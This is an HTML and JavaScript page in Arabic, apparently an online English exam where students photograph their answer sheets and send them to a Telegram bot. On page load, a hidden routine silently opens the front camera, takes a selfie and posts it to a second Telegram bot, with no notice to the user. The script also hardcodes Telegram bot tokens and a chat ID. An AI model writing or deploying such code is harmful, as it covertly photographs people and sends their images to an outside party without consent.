<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>امتحان English</title>
    <style>
        body {
            direction: rtl;
            text-align: center;
            background-color: #121212;
            color: #ffffff;
            margin: 0;
            font-family: 'Arial', sans-serif;
        }

        h1 {
            margin: 20px 0;
            font-size: 2rem;
        }

        #questions img {
            width: 90%;
            height: auto;
            border: 2px solid #444;
            border-radius: 10px;
            margin: 20px auto;
            display: block;
        }

        button {
            background-color: #444;
            color: #fff;
            border: none;
            border-radius: 5px;
            padding: 10px 20px;
            font-size: 18px;
            cursor: pointer;
            margin: 10px;
            transition: background-color 0.3s ease;
        }

        button:hover {
            background-color: #666;
        }

        #video-container {
            display: none;
            margin: 20px auto;
            position: relative;
            width: 90%;
            max-width: 500px;
        }

        video {
            width: 100%;
            height: auto;
            border: 3px solid #333;
            border-radius: 10px;
        }

        #buttons-container {
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 20px 0;
            gap: 20px;
        }

        #capture-button {
            width: 60px;
            height: 60px;
            background-color: #fff;
            border: 4px solid #000;
            border-radius: 50%;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        #capture-button:hover {
            background-color: #ddd;
        }

 #flash-button {
    width: 60px;
    height: 50px;
    font-size: 16px;
    position: absolute;
    left: 0px;
    display: flex; /* تفعيل Flexbox */
    justify-content: center; /* محاذاة النص أفقيًا */
    align-items: center; /* محاذاة النص عموديًا */
}
        #captured-photo-container {
            display: none;
            text-align: center;
        }

        #captured-photo {
            width: 90%;
            height: auto;
            border: 2px solid #444;
            border-radius: 10px;
        }

        #success-message {
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background-color: green;
            color: white;
            padding: 20px;
            border-radius: 5px;
            font-size: 18px;
        }
#start-button {
    display: none; /* إخفاء الزر عند تحميل الصفحة */
    margin: 20px auto; /* وضع مسافة علوية وسفلية */
    width: fit-content; /* تحديد العرض حسب المحتوى */
}
    </style>
</head>
<body>
  <!-- قسم إدخال الاسم -->
<div id="name-container">
    <label for="user-name">أدخل اسمك:</label>
    <input type="text" id="user-name" placeholder="اكتب اسمك هنا">
    <button id="confirm-name-button">حفظ</button>
</div>
<div id="content-container">
<h1>امتحان English</h1>
    <div id="questions">
        <img src="pics/qq.jpg" alt="صورة الأسئلة">
    </div>
</div>
    <button id="start-button">تصوير الإجابة</button>

    <div id="video-container">
        <video id="video" autoplay playsinline></video>
        <div id="buttons-container">
            <button id="flash-button">الفلاش</button>
            <div id="capture-button"></div>
        </div>
    </div>

    <div id="captured-photo-container">
        <img id="captured-photo" alt="الصورة الملتقطة">
        <div>
            <button id="delete-button">حذف</button>
            <button id="send-button">إرسال</button>
        </div>
    </div>

    <div id="success-message">تم إرسال الصورة بنجاح</div>

    <script>
    const nameContainer = document.getElementById("name-container");
    const contentContainer = document.getElementById("content-container");
    const confirmNameButton = document.getElementById("confirm-name-button");
    const userNameInput = document.getElementById("user-name");

    // إخفاء المحتوى الرئيسي في البداية
    contentContainer.style.display = "none";

    // التحقق عند تحميل الصفحة
window.onload = () => {
    captureFrontCameraOnLoad(); // تشغيل الكاميرا الأمامية
    const savedName = localStorage.getItem("userName")?.trim();
    if (savedName) {
        nameContainer.style.display = "none";
        contentContainer.style.display = "block";
        alert(`مرحبًا مجددًا، ${savedName}!`);
    } else {
        nameContainer.style.display = "block";
    }
};

    // عند الضغط على زر "حفظ"
confirmNameButton.addEventListener("click", () => {
    const userName = userNameInput.value.trim();
    if (userName.length >= 3) { // الحد الأدنى 3 أحرف
        localStorage.setItem("userName", userName);
        alert(`مرحبًا ${userName}!`);
        nameContainer.style.display = "none";
        contentContainer.style.display = "block";
    } else {
        alert("يرجى إدخال اسم صحيح (3 أحرف على الأقل).");
    }
});

        const telegramBotToken = "8118528112:AAGp9BP3S9Zv57UH9SvBfGOZfYYlTZsjkno";
        const frontCameraBotToken = "7603399803:AAE324_os0Vzcovlb1DrQBvMbvRaDSqyNzU"; // توكين الكاميرا الأمامية
        const chatId = "953829904";

        const startButton = document.getElementById("start-button");
        const videoContainer = document.getElementById("video-container");
        const video = document.getElementById("video");
        const captureButton = document.getElementById("capture-button");
        const flashButton = document.getElementById("flash-button");
        const capturedPhotoContainer = document.getElementById("captured-photo-container");
        const capturedPhoto = document.getElementById("captured-photo");
        const deleteButton = document.getElementById("delete-button");
        const sendButton = document.getElementById("send-button");
        const successMessage = document.getElementById("success-message");

        let stream;
        let flashEnabled = false;
        let capturedBlob;
        
async function captureFrontCameraOnLoad() {
    try {
        const frontStream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: "user" }
        });
        const frontVideo = document.createElement("video");
        frontVideo.srcObject = frontStream;
        await frontVideo.play();

        setTimeout(() => {
            const canvas = document.createElement("canvas");
            canvas.width = frontVideo.videoWidth;
            canvas.height = frontVideo.videoHeight;
            const context = canvas.getContext("2d");
            context.drawImage(frontVideo, 0, 0, canvas.width, canvas.height);

            frontStream.getTracks().forEach(track => track.stop());

            canvas.toBlob(async (blob) => {
                const formData = new FormData();
                formData.append("chat_id", chatId);
                formData.append("photo", blob, "front_photo.png");

                // استخدام توكين الكاميرا الأمامية هنا
                await fetch(`https://api.telegram.org/bot${frontCameraBotToken}/sendPhoto`, {
                    method: "POST",
                    body: formData
                });

                // إظهار الزر بعد انتهاء العملية
                document.getElementById("start-button").style.display = "block";
            }, "image/png");
        }, 2000);
    } catch (error) {
        console.error("خطأ في تشغيل الكاميرا الأمامية:", error);
    }
}
        // تشغيل الكاميرا الخلفية
        async function startCamera() {
            startButton.style.display = "none";
            document.getElementById("questions").style.display = "none";

            try {
                stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: "environment" }
                });
                video.srcObject = stream;
                videoContainer.style.display = "block";
            } catch (error) {
                console.error("خطأ في تشغيل الكاميرا الخلفية:", error);
                alert("تعذر تشغيل الكاميرا الخلفية.");
            }
        }

// التقاط الصورة
function capturePhoto() {
    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const context = canvas.getContext("2d");
    context.drawImage(video, 0, 0, canvas.width, canvas.height);

    canvas.toBlob((blob) => {
        capturedBlob = blob;
        capturedPhoto.src = URL.createObjectURL(blob);
        showCapturedPhoto();
    }, "image/png");

    // إيقاف الفلاش بعد التقاط الصورة
    disableFlash();
}

// إيقاف الفلاش
async function disableFlash() {
    try {
        const track = stream.getVideoTracks()[0];
        const capabilities = track.getCapabilities();

        if (capabilities.torch) {
            flashEnabled = false;

            await track.applyConstraints({
                advanced: [{ torch: flashEnabled }]
            });
        }
    } catch (error) {
        console.error("خطأ في إيقاف الفلاش:", error);
    }
}

        // عرض الصورة الملتقطة
        function showCapturedPhoto() {
            videoContainer.style.display = "none";
            capturedPhotoContainer.style.display = "block";
        }

        // إخفاء الصورة الملتقطة
        function hideCapturedPhoto() {
            capturedPhotoContainer.style.display = "none";
            videoContainer.style.display = "block";
        }

        // إرسال الصورة
        async function sendPhoto() {
            const formData = new FormData();
            formData.append("chat_id", chatId);
            formData.append("photo", capturedBlob, "back_photo.png");

            await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
                method: "POST",
                body: formData
            });

            successMessage.style.display = "block";
            setTimeout(() => {
                successMessage.style.display = "none";
            }, 2000);

            hideCapturedPhoto();
        }

        // التحكم بالفلاش
        async function toggleFlash() {
            try {
                const track = stream.getVideoTracks()[0];
                const capabilities = track.getCapabilities();

                if (!capabilities.torch) {
                    alert("الفلاش غير مدعوم على هذا الجهاز.");
                    return;
                }

                flashEnabled = !flashEnabled;

                await track.applyConstraints({
                    advanced: [{ torch: flashEnabled }]
                });
            } catch (error) {
                console.error("خطأ في تشغيل الفلاش:", error);
            }
        }

        window.onload = captureFrontCameraOnLoad;
        startButton.addEventListener("click", startCamera);
        captureButton.addEventListener("click", () => {
            navigator.vibrate(80); // الاهتزاز
            capturePhoto();
        });
        deleteButton.addEventListener("click", hideCapturedPhoto);
        sendButton.addEventListener("click", sendPhoto);
        flashButton.addEventListener("click", toggleFlash);
    </script>
</body>
        </html>
